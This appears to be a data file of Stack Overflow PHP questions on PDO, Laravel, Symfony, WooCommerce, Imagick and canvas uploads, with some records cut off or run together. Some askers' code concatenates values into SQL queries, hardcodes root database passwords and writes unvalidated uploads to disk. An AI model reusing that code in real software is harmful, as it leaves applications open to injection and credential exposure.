PHP: making a databaseDo() function for hooking PDO queries," So I started this tutorial as an intro to the PHP PDO. Up until now I've only worked with basic mysql_* type queries. I've noticed that, throughout the tutorial, the connect -> do action -> disconnect pattern is repeated, and only the do action part ever changes. In a real-world setting, would it be a good idea to eliminate repetition by creating a function into which queries can be passed? For example:a function for handling queries: Then, suppose I want to perform the action in the first example of the PDO tutorial, I would set it like this: Scope of $dbhI am using $dbh as an argument. Is this the proper way of passing a variable to a function like this without making it global?  <code>  <?phpfunction databaseDo($action) { $db_hostname = 'localhost'; $db_username = 'root'; $db_password = 'root'; try { // Establish DB connection $dbh = new PDO(""mysql:host=$hostname;dbname=mysql"", $db_username, $db_password); echo 'Connected to database'; // Do something $action($dbh); // <- here goes whatever action we wish to perform // Close connection $dbh = null; } catch(PDOException $e) { echo $e->getMessage(); }?> <?php// Define action$insert = function($dbh) { $query = ""INSERT INTO animals(animal_type, animal_name) VALUES ('kiwi', 'troy')""; $exec = $dbh->exec($query); echo $exec; };// Perform actiondatabaseDo($insert);?>",Making a databaseDo() function for hooking PDO queries

Joomla vs. nopCommerce," This question might be subjective, but I hope you read it thru and help me come to a conclusion.I am an ASP.NET developer.I recently got in contact with a big company that sells products and wants to open an online shopping center.We want to use (at least for a beginning) an open source project.We're considering either nopCommerce or Magento.Obviously, from a personal perspective, I rather nopCommerce since it's in ASP.NET MVC which is my mother tongue, PHP is totally foreign to me (also I like a layered application, and I think ASP.NET MVC is layered better than PHP, this of course can be just BS, whatever).Anyway, for the sake of the company (that I'm supposed to be the developer), is Magento better than nopCommerce? If yes, is it so much better that it's worth I should learn PHP and develop it.We could hire a PHP developer to do the job, but I'm a partner in the company, and we do want I should have personal control of the code (the website will also have additional service other than a shopping site).I'd appreciate any comparisons of nopCommerce and Magento, any links and articles will be welcome. <code> ",Magento vs. nopCommerce
Using base64 encoded string url for zend framework 2, Possible Duplicate: Passing base64 encoded strings in URL I am working on creating a url that will be sent to user. User then clicks the url and this URL tells me who the user is.So all the data I have added to this link using base64 encode. However when user clicks the link he gets redirected to 404 page since encoded url has '/' in it and zend framework router does not find any routes for it.Any way I can suppress the '/'?

How to save a HTML5 Canvas as Image on a server," I'm working on a generative art project where I would like to allow users to save the resulting images from an algorithm. The general idea is:Create an image on an HTML5 Canvas using a generative algorithmWhen the image is completed, allow users to save the canvas as an image file to the serverAllow the user to either download the image or add it to a gallery of pieces of produced using the algorithm.However, Im stuck on the second step. After some help from Google, I found this blog post, which seemed to be exactly what I wanted:Which led to the JavaScript code: and corresponding PHP (testSave.php): But this doesnt seem to do anything at all.More Googling turns up this blog post which is based off of the previous tutorial. Not very different, but perhaps worth a try: This one creates a file (yay) but its corrupted and doesnt seem to contain anything. It also appears to be empty (file size of 0).Is there anything really obvious that Im doing wrong? The path where Im storing my file is writable, so that isnt an issue, but nothing seems to be happening and Im not really sure how to debug this.EditFollowing Salvidor Dalis link I changed the AJAX request to be: And now the image file is created and isnt empty! It seems as if the content type matters and that changing it to x-www-form-urlencoded allowed the image data to be sent.The console returns the (rather large) string of base64 code and the datafile is ~140 kB. However, I still cant open it and it seems to not be formatted as an image. <code>  function saveImage() { var canvasData = canvas.toDataURL(""image/png""); var ajax = new XMLHttpRequest(); ajax.open(""POST"", ""testSave.php"", false); ajax.onreadystatechange = function() { console.log(ajax.responseText); } ajax.setRequestHeader(""Content-Type"", ""application/upload""); ajax.send(""imgData="" + canvasData);} <?phpif (isset($GLOBALS[""HTTP_RAW_POST_DATA""])) { $imageData = $GLOBALS['HTTP_RAW_POST_DATA']; $filteredData = substr($imageData, strpos($imageData, "","") + 1); $unencodedData = base64_decode($filteredData); $fp = fopen('/path/to/file.png', 'wb'); fwrite($fp, $unencodedData); fclose($fp);}?> $data = $_POST['imgData'];$file = ""/path/to/file.png"";$uri = substr($data,strpos($data, "","") + 1);file_put_contents($file, base64_decode($uri));echo $file; function saveImage() { var canvasData = canvas.toDataURL(""image/png""); var xmlHttpReq = false; if (window.XMLHttpRequest) { ajax = new XMLHttpRequest(); } else if (window.ActiveXObject) { ajax = new ActiveXObject(""Microsoft.XMLHTTP""); } ajax.open(""POST"", ""testSave.php"", false); ajax.setRequestHeader(""Content-Type"", ""application/x-www-form-urlencoded""); ajax.onreadystatechange = function() { console.log(ajax.responseText); } ajax.send(""imgData="" + canvasData);}",How to save an HTML5 Canvas as an image on a server?
Gui to Edit Data in MySQL Associative Table," [Edit: I have awarded the bounty but not the question, as I feel there is still a chance for a better answer.]I usually code my MySQL data entry interfaces in php.But for quick projects where I would like to focus on the web side of things (pulling data from the database), I am looking for a form front-end to MySQL. Ideally, this would be an off-the-shelf Win or OSX program that I can hand over to a friend or client so she can input data into forms.An ExampleThe lines above summarize the question, but here is a typical situation to showcase why ""just give them phpMyAdmin"" or some other web interface to MySQL generally wont work.We have two main tables: images and albums. The third is an associative table that associates images with albums.Images: id (PK), filenameAlbums: id (PK), albumAlbum_Image: id (PK), imageid, albumid (these are foreign keys: the two id PKs from the Images and Albums tables)For big projects, I don't mind coding a nice ""back-end"" interface (CRUD) that lets me edit data in a very comfortable, customized way.For small projects, for instance an image gallery for a friend, I would like to be able to only program the ""front-end"": web interfaces that pull data from the database.For the back-end, ideally, I would like to give my friend an off-the-shelf solution so she can enter images, albums, and associations between images and albums.In the old days (I am thinking of DBaseIII), it was really easy to give interfaces to do that entry side of things.Here is a crude approach I have tried. I have set up a view of the associative table joined to the parent tables, so it shows albumid, imageid (the PKs) and album, filename (associated fields in the parents) using this query: The idea with this crude approach is that my friend would enter the parent PKs (albumid and imageid) in the associative table through the view, and that after hitting Insert, the full parent fields (filename and album) would be visible in the View for visual feedback. I have tried this view in three GUI tools: SQLyog (Win), HeidiSQL (Win) and Sequel Pro (OSX). In Heidi and Sequel Pro, I have not found a way to edit the view. In SQLyog, I can edit the PK fields (albumid and imageid) in the view, and the parent fields (album and filename) show properly when I hit ""refresh"". That's great. It works because even though the view shows three tables, we are only editing from one table. But I cannot delete a row as SQLyog doesn't know from which of the three tables we are trying to delete. On the other hand, in SQLyog, I able both able to insert and delete in a Query tab that contains the same query that creates the view, because in this kind of tab SQLyog allows me select the table being edited. So that works, but this workflow might start to be a little complex for my friend: she would have to open SQLyog, connect, open a saved query, select the right table to edit within the query, and make all the other right moves.Wondering if any one knows an existing tool that is really good at making forms for MySQL---ideally a Windows or OSX binary. I will consider a web solution, but I am not interested in a framework---the key is speed of deployment, and if we went the framework route I would be better off making the interface with my own CRUD libraries. Again, I can code it, but my goal with these kinds of ""quickie projects"" is to focus my workload on the front end (web interface to the database), leaving the back end to an off-the-shelf tool. Thanks heaps in advance for any insights. :)Edit: I see that no one has mentioned Navicat or MySQL Workbench.

The resulting images seem to lose a lot of color information and look ""flat"" compared to their non-stripped versions.Based on my research so far, my theory is that one or both of the following is true:Imagick throws away essential color profile information as part of the stripping processImagick recompresses the image upon saving it, losing qualityRegardless of the cause of the problem, I'm looking for a way to remove EXIF information in such a way that it does not affect the image quality or color itself. Is this even possible?Update:Based on Gerald Schneider's answer, I tried enforcing the quality setting to 100% prior to ""stripping"" the image: Unfortunately, the problem remains. Below is example output where despite setting the quality to 100%, images are still flattened.  <code>  $imagick = new Imagick($image);$imagick->stripImage();$imagick->writeImage($image); $imagick = new Imagick($image);$imagick->setCompression(imagick::COMPRESSION_JPEG);$imagick->setCompressionQuality(100);$imagick->stripImage();$imagick->writeImage($image);",How to remove exif from a JPG without losing image quality?

PayPal: submit form via cURL and redirect browser to PayPal," I'm developing a site where customers have several payment options, including PayPal Payments Standard. Since I'm collecting a fair amount of data about the customer, I'd like to process the form on my server before sending the user to PayPal's server. One option is to concatenate the data into a single string, assign the string to the custom field, and then process it in the IPN response, but I find this to be a very inelegant solution. Instead, after collecting the user data, I'm attempting to use cURL to submit a standard HTML PayPal form. How can I redirect the user to PayPal to complete the checkout process? <code>  // Process PayPal payment if ($method == 'PayPal') { // Prepare POST data $query = array(); $query['notify_url'] = 'http://example.com/ipn'; $query['cmd'] = '_cart'; $query['upload'] = '1'; $query['business'] = 'email@example.com'; $query['address_override'] = '1'; $query['first_name'] = $first_name; $query['last_name'] = $last_name; $query['email'] = $email; $query['address1'] = $ship_to_address; $query['city'] = $ship_to_city; $query['state'] = $ship_to_state; $query['zip'] = $ship_to_zip; $query['item_name_'.$i] = $item['description']; $query['quantity_'.$i] = $item['quantity']; $query['amount_'.$i] = $item['info']['price']; // Prepare query string $query_string = ''; foreach ($query as $key=>$value) { $query_string .= $key.'='.urlencode($value).'&'; } $query_string = rtrim($query_string, '&'); // Open connection $ch = curl_init(); //set the url, number of POST vars, POST data curl_setopt($ch,CURLOPT_URL, 'https://www.paypal.com/cgi-bin/webscr'); curl_setopt($ch,CURLOPT_POST, count($query)); curl_setopt($ch,CURLOPT_POSTFIELDS, $query_string); // Execute post $result = curl_exec($ch); // Close connection curl_close($ch); }",Submit form via cURL and redirect browser to PayPal

Better way to display lists of items : cached serialized data vs database queries or other?," I have made a lot of searches about caching data in files (serialize/unserialise vs json_encode/decode, var_export, igbonary) and mysql queries (optimizations, stored procedures, query cache), but at this moment, I wonder what is the better way to optimize a concrete case like the following.Sorry in advance : this is a long topic for a small answer I guess, but it is necessary to understand the project. And excuse my poor english, which is not my first language.Let's imagine that we have this database relationships.Description of the database (estimated number of records in parentheses) :MODULE (10) : is the type of Item, could be article, forum topic, ad, news...ITEM (millions) : any type with a title and some textCATEGORY (50) : items categories (animals, politic, cars, computers...)TAG (hundreds of thousands): category's tags (ex. for politic : Internationnal, France, Barack Obama...)ITEM_TAG (outch) : items and tags associationsSo we have several relationships, and each is recorder at the ITEM creation/update.I have already cached ITEMs data in folders and files with the following example : And I get them by an unserialize(file_get_contents($url)), this part works like a charm !Now I wish to optimize the lists of ITEMs to display them by several options (for example), foreach display with a limit of 100 per pagination :ALL ITEMsITEMs of a MODULEITEMs of a CATEGORYITEMs of a CATEGORY and a MODULEITEMs of a TAGITEMs of a TAG and a CATEGORYITEMs of a TAG and a CATEGORY and a MODULEI already know how to do this in SQL and to put the results in a cache tree.My problem, with those cache files, is that when a new ITEM is created/updated, the list may have to be refreshed with a lot of strictness.First question : So what will happen if ITEMs are created/updated (so those lists too) at the same time ?Does the LOCK_EX of the file_put_contents(); will do his job while getting files from file_get_contents(); ?Second questionI understand that more PHP will work, less mySQL will (and the otherwise), but what is the better (faster to display) way to do those lists with pagination, which will be displayed each second or more, and only modified by adding/updating a new ITEM ?My cache system (I don't think so...) Stored procedures in mySQLSeveral database servers and/or several files serversOtherAny ideas, examples, links greatly appreciated.P.S. : just for fun I may ask ""how does Facebook"" and ""how does stackoverflow"" ? <code>  public function cacheItem(){ $req=mysql_query(""SELECT id, title, content, id_mod, id_cat FROM ITEM WHERE ITEM.id='"".$this->id.""'"")or die(mysql_error()); if(mysql_num_rows($req)==1) { $this->itemData=mysql_fetch_array($req); $this->folder=floor($this->id/1000);//1000 items max per folder $this->itemUrl=$this->folder.""/"".$this->id."".txt""; if(!file_exists($this->itemUrl)) { touch($this->itemUrl); } file_put_contents($this->itemUrl,serialize($this->itemData),LOCK_EX); }}",Better way to get lists of items : cached serialized data vs database queries or other?

IE10 sharing cookies across subdomains by deafult," IE10 appears to handle cookies and subdomains differently than other major browsers (IE8, IE9, Firefox, Chrome, Safari).We use subdomains extensively for test environments, e.g.:user1.devel.example.comuser2.devel.example.comqa.example.comAnd our production environment lives at the top, e.g. example.com (and technically at www.example.com as well).We use the php setcookie($name, $value, $expires) function naively (no explicit path or domain is specified) to set a cookie, and then clear cookies (when user logs out) by assigning an empty string to the value. This has always worked fine, and each unique subdomain used their own cookies.IE10 now ""shares"" the cookie that was set in the TLD with all subdomains. The initial symptom we observed was that no one could log out of the subdomain. We've observed a few things:Even though it shares the value, no subdomain is able to clear the cookie.When the TLD clears the cookie, it is immediately removed from all subdomains as well. Has anyone else observed similar behavior to how IE10 stores/applies cookies relative to subdomains? Is there any workaround, other than being explicit about which domain the cookie applies to when sending the initial Set-Cookie header? <code> ",IE10 sharing cookies across subdomains by default

heuristic date extraction from the string?," I have a problem to heuristically parse a string of text which contains a date but in a rather arbitrary (unknown) format. Input text is a sentence in English language plus arbitrary syntax symbols (like a subset of \W regexp class). The task of the algorithm is to extract date only after filtering away any potential garbage (noisy) words, unrelated to the date. It is allowed that the algorithm could fail and return no result. If only two combination of two joined digits (MM) together with four other digits (YYYY) were found in the string - it is assumed that two digits corresponds to the month of the date and the day is taken to be 01 (first day of the month). Result gives a date in ""YYYY-MM-DD"" (SQL) format (of type DATE).My idea is to proceed with designing a series of filters using preg_replace & co. Further, use logical constraints on the range of $year, $day, use a vocabulary for $month, etc., but I would not be surprised if similar but more elegant solutions or approaches are thinkable or already exist. If so, please let me know about them. I would also appreciate if any critics or potential pitfalls can be pointed out.Relation to similar questions:Please note that the question is different from more basic date parsing questions as:PHP Parse Date StringHow to parse any date formatsince in my case I can not specify or determine the format of the string. On the other hand the following questions talk about similar tasks:Extracting date from a string in PythonExtract multiple date format from few string variables in phpExtracting date from a string in PHPI am not sure if the last one is a duplicate, it is not ultimately clear to me what OP wants to parse (although checkdate and date_parse seem to be partially useful). But the first question on the whole ""mokey business"" is also true for my case and has been addressed by fuzzy parsing as in Finally, the second one contains great grabbing regexp (almost ""fuzzy"").PS by elegant I understand that the code is rather compact (there is no significant limitations on performance, so using ""hacky"" regexps is ok). <code>  function parseDateStr($text) { $cleanText = filter($text); # ... $day = findDay($cleanText); $month = findMonth($cleanText); $year = findYear($cleanText); # .. assert constraints, parse again or fail return sprintf('%04d-%02d-%02d', $year, $month, $day)} dparser.parse(""monkey 2010-07-10 love banana"",fuzzy=True)",heuristic (fuzzy) date extraction from the string?

CakePHP: where to register event listeners," I'm trying to use the Event System in CakePHP v2.1+It appears to be quite powerful, but the documentation is somewhat vague. Triggering the event seems pretty straight-forward, but I'm not sure how to register the corresponding listener(s) to listen for the event. The relevant section is here and it offers the following example code: But it does not say where this code should reside. Inside a specific controller? Inside the app controller?In case it's relevant, the listener will be part of a plugin which I am writing. Update:It sounds like a popular way to do this is by placing the listener registration code in the plugin's bootstrap.php file. However, I can't figure out how to call getEventManager() from there because the app's controller classes, etc aren't available.Update 2:I'm also told that listeners can live inside Models.Update 3:Finally some traction!

Laravel 4 - Validation errors in AJAX mode," Currently I use this to display validation errors via ajax: It works fine, does exactly what I need.The problem is what I have to do to transport the errors from laravel to ajax: If I want to have the field names as key, I have to iterate $rules, but even if I don't use field names as key, yet I have to iterate error messages to construct $verrors.How could I convert $v->messages() to the equivalent of $verrors without the need to iterate?

Generating API documents," Not sure if this should be here or on Programmers.Generating API documentsI would like some advice on how I should generate API documentation for an internal project. I am relatively new to Git and we are trying to implement some sound build/deploying practices.One of the things we discussed was making sure our code base is well documented and generating documentation using something like PhpDocumentor2 or one of the many similar tools.We have started to implement a workflow similar to the one detailed here. Should I automate when the docs are built?For example a pre or post commit hook in git when tagging a release. Or should when I merge develop to a release branch just manually create the docs and commit to the repository?Is it standard practice to have docs generated for each release?I might have misunderstood the process, should a new doc release correlate with a git release/tag?Where do you store the generated docs?In the same repository? a different repository? Hosted somewhere like Read The Docs or just internally?The current project we are working on is only small, but we would like to roll out the process to other larger projects in the future if successful.ContextThe project is a Magento extension which we would like to provide API docs, unit testing, and PSR conforming code. I am lacking information on how the whole workflow integrates. PHPunit and PHPDocumentor2 are installed locally via Composer.I have heard and looked at Travis Ci, but I'm not sure if Docs fall in to that category.This question may seem petty and/or trivial, however, I've not much experience in integration and git workflow and I couldn't find much information around. <code> ",Generating API documents in Git Workflow

"How to store repeating dates, Daylight Savings Time, other issues"," I'm storing events in my database. I have 'start' and 'end' date times, 'tickets_start' and 'tickets_end' (for when ticket sales actually start/end - as opposed to the start/end of the actual event).So far, I've built methods that do all the fun stuff like converting the date/times to GMT before saving, then back to their respective timezone for display.I'm storing the timezone in a varchar field with values like ""America/New_York"".But - now I need to start dealing with if the user wants to allow repeating events. I've done it before, and it's not that big a deal, but never across multiple timezones.At first, I thought it'd be no big deal, but then realized that - if the initial start date was in July (as example), and it repeats every month for a year, at some point, Daylight Savings Time will make it so that the conversion from GMT will change a time differently. One month, when converting 12:00, it would change it to -5, and the next, it would change it to -4 because of DST.My current thought is that I'll store a 'dst' tinyint(1) for whether the start/end dates were entered during DST, and then make a method to alter the time by an hour if/when necessary.But - figured I'd ask here in hopes maybe there's a ""normal"" for this or an easy something that I'm not thinking of.(cakephp 2.4.x) <code> ",How to store repeating dates keeping in mind Daylight Savings Time

Laravel and view caching," Some friends and I decided to start working on a project and we came across Laravel and thought it might be a good tool. We started using it locally to develop out some of our pages and noticed something strange.When we update a view with different information, it would take almost 5 to 10 minutes before the views information would change. It's like Laravel is caching the view and put a TTL on it. I know this isn't anything I am doing on my local web server because I have used other frameworks and I have never encountered this issue.Upon searching the Internet, I can't find a great answer on how to disable this. I want to use Laravel, but find it worthless if it takes a while for my views to update each time I want to make a change. In fact, it sounds counter productive.Is there any way to disable this? Why are my views taking forever to update right out of the box? <code> ",Laravel and view caching in development -- can't see changes right away

Laravel 4 dynamic routes on multiple levels," I'm trying to create a dynamic route for an unlimited number of URL levels.Here's my current route This works for the first level. So a URL like something.com/foo/ would work. But if I had something like something.com/foo/bar/ it wouldn't catch that URL. I need it to match unlimited levels. That way in my controller it'll get me a variable of whatever the entire link is.I know I could do But that just seems like an overkill. Is there a better way to do this so it'll match to the end of the URL?Thanks. <code>  Route::get('{pageLink}', array('uses' => 'SiteController@getPage')); Route::get('{pageLink}', array('uses' => 'SiteController@getPage'));Route::get('{pageLink}/{pageLink2}', array('uses' => 'SiteController@getPage'));Route::get('{pageLink}/{pageLink2}/{pageLink3}', array('uses' => 'SiteController@getPage'));",Laravel 4 route with unlimited number of parameters

How can I throw a 403 exception?," I am doing a check if there is a specific token in my request URI and throw a Symfony\Component\Security\Core\Exception\AccessDeniedException if there is no token or the token is wrong. But when I use this AccessDeniedException, Symfony2 simply redirects to the login page. Instead, I would like to have a dedicated 403 error page (I already created app/Resources/TwigBundle/views/Exceptions/error403.html.twig file).What would I have to change in order to achieve this? Do I have to use a PHP native Exception? But how can I tell to pass a 403 error code?Does Symfony2 maybe have a specific 403-Exception which doesn't simply redirect to login? <code>  if(!isset($token) && $token != 'whatever') { throw new AccessDeniedException('No token given or token is wrong.');}",How can I throw a 403 exception in Symfony2?

Here is what phpinfo() displays about Imagick.Edit 6I have read the following website and here is what it suggests to do, and what I have do after.If you download a DLL, make sure it is compiled with the same version of visual studio as Apache and PHP (Probably VC11 for PHP 5.5)Download with thread safety or no thread safety as per your setupCopy the DLL to your extensions folderEnable the extension in php.iniDownload and install ImageMagick, make sure to select the version that comes with the dynamic link libraries, also make sure it is built for the same platform as PHP and Apache (32/64bit), even if you have a 64-bit system, like me you will probably be running the 32-bit version of PHP and ApacheAdd the ImageMagick path to your systems PATH variable, the installer can do this for you, but check it in Advanced System Settings to make sure it is thereRestart ApacheCheck php_info() to see that the extension is enabled and that is supports some image formatsMy results1.

Using preg_replace on a array," I have a relatively large array of elements which I want to search for a string and replace any matches. I'm currently trying to do this using preg_replace and regular expressions: I want to get all values which match either 00IPT.A or 0IPT.A (with 0 representing any numerical character and A representing any letter) and replace them with IPT. However, I'm getting array to string conversion notices. Is there any way to get preg_replace to accept an array data source? If not, is there any other way I could achieve this?The documentation says that preg_replace should be able to accept array sources this is the reason I'm asking. The string or an array with strings to search and replace. If subject is an array, then the search and replace is performed on every entry of subject, and the return value is an array as well.The array is multidimensional if that helps (has multiple arrays under one main array). <code>  preg_replace(""/\d?\dIPT\.\w/"", ""IPT"", $array);",Using preg_replace on an array

Calling a constant as a function name?," In PHP, you can call functions by calling their name inside a variable. But, you can't do this with constants. There are workarounds, like these: The PHP documentation on callable says: A PHP function is passed by its name as a string. Any built-in or user-defined function can be used, except language constructs.There seems to be nothing about constant values not being callable.I also tried to check it, and of course, prints bool(true).Now, is there an explanation as to why is it this way? As far as I can see all the workarounds rely on assigning the constant value to a variable, by why can't constant be called?And again, just to make it super clear, I don't need a way to call the function, I even presented some there. I want to know why PHP doesn't allow calling the function directly through the constant. <code>  function myfunc(){ echo 'works'; }$func = 'myfunc';$func(); // Prints ""works"" define('func', 'myfunc');func(); // Error: function ""func"" not defined $f = func;$f(); // Prints ""works""call_user_func(func); // Prints ""works""function call($f){ $f(); }call(func); // Prints ""works"" var_dump(is_callable(func));",How to call a constant as a function name?

How to find the center of leaflet polygon?," I have a bunch of leaflet polygons on a map I created. Each polygon represents something different.

using setters and getters dynamically," I'm using symfony and doctrine. The server gets a HTTP PATCH request for the URL /company/{id} containing the property of a model and its value like {""name"": ""My new name""} The new value needs to be persisted into the DB. Now I could just enter $company->setName($requestContentObj[0]); but the property being received will vary. Right now I'm using the following code to be able to handle every property: But this doesn't look very smart especially because I know that I will have other entities like news, products, users, etc that will have their properties updated in the same manner. I'd like to do something like this: First thought that crossed my mind was to put this switch statement inside the company class inside this set function and also inside all the other entity classes I have. But is there a better way? Maybe symfony/doctrine has the solution already built-in, but I didn't find anything that would suit me.I still want to use setters and getters as a long-term investment.Thank you. <code>  $request = Request::createFromGlobals();$requestContentJSON = $request->getContent();$requestContentObj = json_decode($requestContentJSON);$repository = $this->getDoctrine()->getRepository('MyBundle:Company');$company = $repository->find($id); foreach($requestContentObj as $key => $value){ switch($key){ case 'name': $company->setName($value); break; case 'department': $company->setDepartment($value); break; case 'origin': $company->setOrigin($value); break; case 'headquarters': $company->setHeadquarters($value); break; case 'email': $company->setEmail($value); break; case 'twitterid': $company->setTwitterId($value); break; case 'description': $company->setDescription($value); break; }} $company->set(""property"", ""value"");",symfony doctrine using setters and getters dynamically
Supervisord log file," I have started some php processes with supervisord, and i am keeping all the stdout logs on one file and the error output on an other one. I have set the max size at 1mb and i am running 3 copies of each process. When i check the logs there appears to be more than one of the log files, so instead of ""log1.log"" there is ""log1.log log1.log.1 log1.log.2 log1.log.3"". The process seems to work correctly so i am just asking for clarification, does this happen because the log is locked for writing by an other process so the process that tries to write has to use an other file? <code>  [program:Sitbot1_1_1]command=/usr/local/bin/php -f process.php 1 1 1 2 ;

Regex for removing special charaters on a multilingual string," The most common regex suggested for removing special characters seems to be this - The problem is that it also removes non-English characters.Is there a regex that removes special characters on all languages? Or the only solution is to explicitly match each special character and remove them? <code>  preg_replace( '/[^a-zA-Z0-9]/', '', $string );",Regex for removing special characters on a multilingual string
can't remove Heroku Buildpack," I installed heroku-buildpack-php-tyler on my Heroku app a few days ago, and it all seemed to work fine. I installed it by running the following command: However I now want to remove it. I tried using the following command: But it returns the following error message:Unsetting BUILDPACK_URL=git://github.com/iphoting/heroku-buildpack-php-tyler.git and restarting hnf-heroku... failed! Resource not found`Because PHP isn't officially supported by Heroku, there's not much documentation about this. So how do I uninstall this buildpack? <code>  heroku config:set BUILDPACK_URL=git://github.com/iphoting/heroku-buildpack-php-tyler.git heroku config:unset BUILDPACK_URL=git://github.com/iphoting/heroku-buildpack-php-tyler.git",How do I uninstall this buildpack in Heroku?
Server Side processing with Datatables 10.0," Hi I'm having some issues getting the server side processing functionality of data tables to work with SQL Server.I've got a test page that should display two columns from a database table(for now).HTML: I'm using the example code found on the website Here for the server side functions:http://next.datatables.net/examples/server_side/simple.htmlThis is my version of the php page being called: This then calls the second example PHP found here:https://github.com/DataTables/DataTables/blob/master/examples/server_side/scripts/ssp.class.phpHere is my Copy of it. The only Modification I performed was to remove the block of code that is required for the examples. I keep getting an error saying that the code cannot find the driver though I've got the sqlserv and pdo_sqlsrv Drivers installed din my php environment. Is there something wrong on the code that's causing this error? Are my drivers incorrect? Any help with this would be appreciated. I've got upwards of 65,000 rows of data to process and to send that all to the client in one go will be impossible.  <code>  <!DOCTYPE html PUBLIC ""-//W3C//DTD XHTML 1.0 Transitional//EN"" ""http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd""><html xmlns=""http://www.w3.org/1999/xhtml""><head> <title></title> <link rel=""Stylesheet"" type=""text/css"" href=""DataTables-1.10.0/media/css/jquery.dataTables.min.css"" /></head><body><table id=""example"" class=""display"" cellspacing=""0"" width=""100%""><thead> <tr> <th align=""center"">PK</th> <th align=""center"">Network</th> </tr></thead><tfoot> <tr> <th align=""center"">PK</th> <th align=""center"">Network</th> </tr></tfoot></table></body><script type=""text/javascript"" src=""DataTables-1.10.0/media/js/jquery.js""></script><script type=""text/javascript"" src=""DataTables-1.10.0/media/js/jquery.dataTables.min.js""></script><script type=""text/javascript"" charset=""utf-8"">$(document).ready(function () { $('#example').dataTable({ ""processing"": true, ""bServerSide"": true, ""ajax"": ""PHP/testGetArchive.php"" });});</script></html> <?php/* * DataTables example server-side processing script. * * Please note that this script is intentionally extremely simply to show how * server-side processing can be implemented, and probably shouldn't be used as * the basis for a large complex system.

However, I cannot find how to decrease the quantity anywhere.There are multiple questions about this, none answered. Or I`m searhing in the wrong directory.However, can someone give me a code example on how to decrease cart`s quantity for a product out of the box?

I also tried add to cart with negative quantity, did not work either. UPDATE: adding this code to a WP page template and calling that page does not give me the error anymore. However, after calling the code, it does not update the cart. What can I do? Thanks a lot I hope someone can help here! <code>  $cartKey = $_POST['cart_item_key']; //The cart key required by set_quantity method$cartQty = $_POST['cart_item_qty']; //the quantity I provide in my postglobal $woocommerce;echo $woocommerce->cart->set_quantity($cartKey,$cartQty);",Mini cart quantity change in Woocommerce

Laravel Routing Before Filter," Laravel's routing doesn't seem to be working as expected? From what I understand, if I intend to override a route, all I need to do is to put the expected route before the other one.What I have is something like this: Which I assumed that if i post to this route http://domain.com/newsletter it should only run the defaultLoads route filter.However, when I run php artisan routes, I get this: | | POST newsletter | newsletter.store | NewsletterController@store | defaultLoads, login | |Although it reads the route correctly (php artisan loads that correct route in the correct place) but the resource route's filter affected the route even when it's not in that filter group.So my question:Is this how Laravel works?If so, is it possible for me to override that POST->newsletter route without actually doing the following?  <code>  Route::group(array('before'=>'defaultLoads'), function(){ Route::post('newsletter', 'NewsletterController@store'); Route::group(array('before'=>'login'), function(){ Route::resource('newsletter','NewsletterController'); }}); Route::group(array('before'=>'defaultLoads'), function(){Route::post('newsletter', 'NewsletterController@store');Route::group(array('before'=>'login'), function(){ Route::get('newsletter','NewsletterController@get'); Route::get('newsletter/{id}', 'NewsletterController@show'); //etc all the rest of the routes except post}});",Laravel - Overriding a resource route into a different route filter group

Does php silently optimizes consecutivly following fseek-commands to one fseek command?," I am running Windows 7 - 64 bit, with the latest XAMPP version that has a 32-bit PHP version.On testing http://php.net/manual/en/function.fseek.php#112647 for a very big file (bigger than PHP_MAX_INT 2147483647) I'm now pretty sure, that the consecutively following fseeks are summed up before being executed on the filepointer. I have two questions:Could I break up this summing up with reasonable means (or only with the workaround mentioned in the link above)?Is this aggregation happening in PHP (as I assume, though I don't know where in PHP) or in Windows 7?

(32-bit PHP only can seek up to PHP_MAX_INT + 8192. Reading from there on is still possible, but I don't know how far.)

Sending message to a server on a different port," We are developing a realtime app and we are using nginx push stream module for a websockets part. Firstly, data is send from a client to a php script that does some authentication and stores needed information in database and then pushes information to nginx that later sends it to a subscribed users on a specific sockets. Quite often there will be situations when there are more that 30 http requests made from this script to local nginx (which I am not exactly sure is a bad thing?). QuestionIs it possible to send information from php to nginx without http requests? Is there any way that my php script can communicate with nginx? What is a best practise to handle this kind of communications? Is sending 30+ http requests per php script a good practise? I have read towards some AMQP solutions but haven't found information where nginx is a consumer of messages from rabbitmq. I will gladly provide any additional information if something is not clear. <code> ",Sending information to a ngnix from php on the same server without http

The purpose of these log tables is to review operations performed for a single entity (for example: logs belonging to a particular manufacturer and the changes made in the past for that manufacturer etc.,)I am planning to use Eloquent and I have generated an Eloquent model for each of the major tables.My Question : Should I generate separate Eloquent models for each of the log tables or just write a method like user_log() in the model of the major table to write my log.P.S : Number of users going to use my application are few, therefore writing logs to a database is preferred over file logs. <code> ",Laravel-5 Separate model for each log table

Maximum Profit Algorithm - Hotel," I'm struggling with this question for so long.There are n persons who want same room in a hotel. Each person wants to stay in the hotel for his own convenient time but only one person can stay at a time. Assume that room is available from 5AM to 11PM. Hotel manager takes 500 rupees from each person who is staying in that room. It does not matter how long a person stays in that room. We have to maximize the profit of the manager. Let us say that n =4 i.e. four persons want same room. Let us say that 1st person wants the room from 6AM to 8AM and 2nd person wants room from 7AM to 8AM, 3rd person wants room from 8AM to 12PM and 4th person wants room from 11AM to 1PM.By observing above figure, we can easily see that manager can only allow maximum of two persons to stay (1st and 3rd or 1st and 4th or 2nd and 3rd or 2nd and 4th). So maximum profit he can get is 500+500 = 1000 rupees. So we have to implement an algorithm which can find maximum profit value. Assume that the persons want the room only b/w 5AM to 11PM and each person wants room in multiple of hours.Input description:{<1st person starting time>#<1st person ending time>,<2nd person starting time>#<2nd person ending time>,, # }Output description:Output should be maximum profit value.For the example considered in the question, output is 2000.Example:Input: {6AM#8AM,11AM#1PM,7AM#3PM,7AM#10AM,10AM#12PM,2PM#4PM,1PM#4PM,8AM#9AM}Output:2000 <code> ",Interval Scheduling Algorithm or Activity Selection Algorithm

Redirect an octet stream using Apache or PHP," I have a webserver which serves the client with an octet stream on port 20000 (it's actually a socket.io server hosted with node.js). This is running on a shared hosting account with a regular Apache server running on port 80 (this cannot be turned off, hence the socket.io server is on port 20000). Due to firewalls and such, I cannot expect the user to be able to connect to port 20000 (or any other than 80). So, how can I serve the client with the octet stream produced by the socket.io server from the Apache server (sort of like a reverse proxy)? Unfortunately I cannot use mod_proxy on my Apache server given restraints of my hosting plan. I was thinking I could do this with a PHP page that opens a socket somehow.Update: I also have Django for Python 3 installed on my server which could be useful. Please note that the proxy cannot simply request the target page and serve it back to the client since the data has to be transferred in real time. <code> ",Redirect an octet stream in Apache using PHP or Django

